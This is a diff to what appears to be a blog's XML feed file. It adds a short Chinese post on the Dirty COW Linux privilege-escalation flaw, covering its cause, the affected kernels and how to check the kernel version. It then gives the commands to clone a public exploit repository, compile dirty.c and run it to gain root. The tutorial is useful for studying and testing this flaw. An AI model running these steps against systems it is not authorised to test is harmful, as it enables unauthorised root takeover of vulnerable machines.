@@ -8,9 +8,21 @@
       <link href="2021/07/14/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
       <url>2021/07/14/%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h1 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h1><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>Dirty COW漏洞是一种发生在<strong>写时复制</strong>的<strong>竞态条件</strong>漏洞。</p><p>详细分析参考链接</p><p><a href="https://blog.csdn.net/hbhgyu/article/details/106245182">https://blog.csdn.net/hbhgyu/article/details/106245182</a></p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p> Linux kernel 2.x through 4.x before 4.8.3</p><h3 id="验证漏洞是否存在"><a href="#验证漏洞是否存在" class="headerlink" title="验证漏洞是否存在"></a>验证漏洞是否存在</h3><p>使用<code>uname -a</code>命令查看linux内核信息，发现在脏牛漏洞范围内</p><p><img src="%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83.assets/image-20210714091603781-1626225366290.png" alt="image-20210714091603781"></p><h3 id="下载EXP"><a href="#下载EXP" class="headerlink" title="下载EXP"></a>下载EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Pa55w0rd&#x2F;dirtycow.git</span><br></pre></td></tr></table></figure><h3 id="将c文件编译成可执行文件"><a href="#将c文件编译成可执行文件" class="headerlink" title="将c文件编译成可执行文件"></a>将c文件编译成可执行文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><h3 id="执行-dirty-密码-命令，即可进行提权。"><a href="#执行-dirty-密码-命令，即可进行提权。" class="headerlink" title="执行./dirty 密码 命令，即可进行提权。"></a>执行./dirty 密码 命令，即可进行提权。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dirty 密码</span><br></pre></td></tr></table></figure><p><img src="%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83.assets/image-20210714091439210.png" alt="image-20210714091439210"></p>]]></content>
       
       
+      <categories>
+          
+          <category> 权限提升 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
       
     </entry>
     
